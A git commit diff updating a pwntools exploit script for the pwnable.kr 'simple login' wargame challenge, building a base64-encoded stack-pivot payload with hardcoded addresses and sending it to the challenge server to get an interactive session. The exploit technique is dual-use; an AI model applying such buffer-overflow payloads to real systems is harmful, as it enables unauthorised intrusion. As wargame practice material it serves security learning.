67eef18668ac7e2ea538c6b7a0e3659d3915ea7e
M4xW4n9 <aboultraman@gmail.com>
2018-04-01 13:32:27 +0800

    stack pivot

--- pwnable_simple_login/exp.py
+++ pwnable_simple_login/exp.py
@@ -3,13 +3,32 @@
 __Auther__ = 'M4x'
 
 from pwn import *
+from time import sleep
+import sys
+from base64 import b64encode
 context.log_level = "debug"
+context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
-payload = flat("AAAA", 0x8049278, 0x811EB40).encode("base64")
+if sys.argv[1] == "l":
+    #  io = process("", env = {"LD_PRELOAD": ""})
+    io = process("./login")
 
-#  io = process("./login")
-io = remote("pwnable.kr", 9003)
-io.sendlineafter("Authenticate ", payload)
+else:
+    io = remote("pwnable.kr", 9003)
+
+#  elf = ELF("")
+#  libc = ELF("")
+
+def DEBUG():
+    raw_input("DEBUG: ")
+    gdb.attach(io)
+
+target = 0x8049278
+buf = 0x811EB40
+payload = p32(0xdeadbeef) + p32(target) + p32(buf)
+
+#  DEBUG()
+io.sendlineafter(" : ", b64encode(payload))
 
 io.interactive()
 io.close()
